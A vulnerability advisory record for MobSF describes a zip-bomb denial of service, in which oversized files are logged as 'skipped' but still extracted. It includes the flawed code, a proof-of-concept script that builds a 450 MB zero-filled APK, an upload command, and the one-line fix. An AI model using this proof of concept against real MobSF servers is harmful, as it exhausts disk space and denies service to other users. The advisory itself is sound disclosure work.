@@ -1,0 +1,171 @@
+advisory_id: mobsf/PYSEC-2026-3691
+datasource_id: pypa/mobsf/PYSEC-2026-3691
+datasource_url: https://github.com/pypa/advisory-database/blob/main/vulns/mobsf/PYSEC-2026-3691.yaml
+aliases:
+  - CVE-2026-68924
+  - GHSA-x768-8642-mmq9
+  - PYSEC-2026-3691
+summary: |
+  MobSF Vulnerable to Zip Bomb Denial of Service via Per-File Size Limit Bypass in ZIP/APK Extraction
+  ### Summary
+
+  When extracting uploaded ZIP/APK files, MobSF checks if individual files exceed `ZIP_MAX_UNCOMPRESSED_FILE_SIZE` (400 MB) and logs "Skipping" — but the code lacks a `continue` statement, so extraction proceeds anyway. The log message is misleading; the file is still written to disk.
+
+  ### Verified Impact (Code Audit)
+
+  The vulnerable code path in `shared_func.py` lines 153–182:
+
+  ```python
+  # Line 156: Size check
+  if fileinfo.file_size > settings.ZIP_MAX_UNCOMPRESSED_FILE_SIZE:
+      size_mb = fileinfo.file_size / (1024 * 1024)
+      msg = (f'File too large ({size_mb:.2f} MB). Skipping '
+             f'{sanitize_for_logging(file_path)}')
+      logger.warning(msg)
+      # ← BUG: No 'continue' here! Execution falls through.
+
+  # Line 161: Total size check (separate)
+  if total_size > settings.ZIP_MAX_UNCOMPRESSED_TOTAL_SIZE:
+      raise Exception(msg)
+
+  # Line 171-178: Permission fixing (only dirs get 'continue')
+  if fileinfo.is_dir():
+      continue
+  else:
+      fileinfo.external_attr = ...
+
+  # Line 182: EXTRACTION ALWAYS HAPPENS FOR FILES
+  try:
+      zipptr.extract(file_path, ext_path)   # ← Runs regardless of size check
+  ```
+
+  The control flow is clear: after the size check logs "Skipping", no `continue` or `break` is issued. The code proceeds to line 182 which extracts the file unconditionally.
+
+  ### Steps to Reproduce
+
+  **1.** Create a ZIP/APK with a file exceeding 400 MB (zeros compress very well):
+
+  ```python
+  #!/usr/bin/env python3
+  import zipfile, tempfile, os
+
+  output = tempfile.mktemp(suffix='.apk')
+  with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
+      zf.writestr('AndroidManifest.xml', '<manifest package="com.poc"/>')
+      # 450 MB file (exceeds 400 MB limit) — compresses to ~KB
+      info = zipfile.ZipInfo('assets/huge.bin')
+      info.compress_type = zipfile.ZIP_DEFLATED
+      with zf.open(info, 'w') as f:
+          for _ in range(450):
+              f.write(b'\x00' * (1024 * 1024))  # 1 MB at a time
+
+  print(f"Created: {output} ({os.path.getsize(output)} bytes compressed)")
+  ```
+
+  **2.** Upload via API:
+
+  ```bash
+  curl -X POST http://127.0.0.1:8000/api/v1/upload \
+    -H "X-Mobsf-Api-Key: YOUR_KEY" \
+    -F "file=@poc.apk"
+  ```
+
+  **3.** Trigger scan, then verify:
+
+  ```bash
+  # Log says "Skipping" but file exists on disk:
+  grep "File too large" ~/.MobSF/debug.log
+  ls -la ~/.MobSF/uploads/HASH/assets/huge.bin  # 450 MB file is there
+  ```
+
+  ### Why This Is Not a Self-Bug
+
+  - This affects any user who scans a maliciously crafted APK
+  - The APK could come from a legitimate-looking package submitted for security review
+  - Matches the pattern of GHSA-c5vg-26p8-q8cr (Zip bomb DoS, affected <=4.3.2) — that advisory fixed the total size limit but this per-file bypass persists
+  - Impact: disk exhaustion preventing further scans for other users
+
+  ### Remediation
+
+  Add `continue` after the size warning:
+
+  ```python
+  if fileinfo.file_size > settings.ZIP_MAX_UNCOMPRESSED_FILE_SIZE:
+      size_mb = fileinfo.file_size / (1024 * 1024)
+      msg = (f'File too large ({size_mb:.2f} MB). Skipping '
+             f'{sanitize_for_logging(file_path)}')
+      logger.warning(msg)
+      continue  # ← ADD THIS LINE
+  ```
+impacted_packages:
+  - purl: pkg:github/mobsf/mobile-security-framework-mobsf
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mobsf/mobile-security-framework-mobsf
+        commit: 62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:pypi/mobsf
+    affected_versions: vers:pypi/3.2.6|3.2.7|3.2.8|3.2.9|3.3.3|3.3.5|3.4.0|3.4.3|3.4.6|3.5.0|3.6.0|3.6.9|3.7.6|3.9.7|4.1.3|4.3.0|4.3.2|4.4.0|4.4.2|4.4.5
+    fixed_versions: vers:pypi/4.5.1
+    affected_packages:
+      - pkg:pypi/mobsf@3.2.6
+      - pkg:pypi/mobsf@3.2.7
+      - pkg:pypi/mobsf@3.2.8
+      - pkg:pypi/mobsf@3.2.9
+      - pkg:pypi/mobsf@3.3.3
+      - pkg:pypi/mobsf@3.3.5
+      - pkg:pypi/mobsf@3.4.0
+      - pkg:pypi/mobsf@3.4.3
+      - pkg:pypi/mobsf@3.4.6
+      - pkg:pypi/mobsf@3.5.0
+      - pkg:pypi/mobsf@3.6.0
+      - pkg:pypi/mobsf@3.6.9
+      - pkg:pypi/mobsf@3.7.6
+      - pkg:pypi/mobsf@3.9.7
+      - pkg:pypi/mobsf@4.1.3
+      - pkg:pypi/mobsf@4.3.0
+      - pkg:pypi/mobsf@4.3.2
+      - pkg:pypi/mobsf@4.4.0
+      - pkg:pypi/mobsf@4.4.2
+      - pkg:pypi/mobsf@4.4.5
+    fixed_packages:
+      - pkg:pypi/mobsf@4.5.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '4.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/pypa/advisory-database/blob/main/vulns/mobsf/PYSEC-2026-3691.yaml
+weaknesses: []
+references:
+  - url: https://github.com/advisories/GHSA-x768-8642-mmq9
+    reference_type:
+    reference_id:
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF
+    reference_type:
+    reference_id:
+  - url: https://pypi.org/project/mobsf
+    reference_type:
+    reference_id:
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/2627
+    reference_type: other
+    reference_id: 2627
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+    reference_type: other
+    reference_id: 62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-68924
+    reference_type:
+    reference_id: CVE-2026-68924
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-x768-8642-mmq9
+    reference_type: other
+    reference_id: GHSA-x768-8642-mmq9
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.5.1
+    reference_type: other
+    reference_id: v4.5.1
+exploits: []
